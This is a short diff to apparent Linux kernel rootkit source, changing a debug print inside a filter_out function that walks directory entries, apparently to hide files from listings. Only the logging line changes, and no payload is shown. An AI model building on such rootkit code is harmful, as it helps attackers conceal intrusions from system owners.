@@ -65,7 +65,7 @@ static inline int filter_out(struct linux_dirent __user *dirp, int length, int (
 		d = *(dirp+index);
 		reclen = d.d_reclen;
 		
-		pr_info("%s", d.d_name);
+		pr_info("d_name: \"%s\"", d.d_name);
 		
 		if (reclen <= 0) {
 			pr_info("ROOTKIT reclen was 0 (CRITICAL ERROR THIS SHOULD NEVER HAPPEN)");
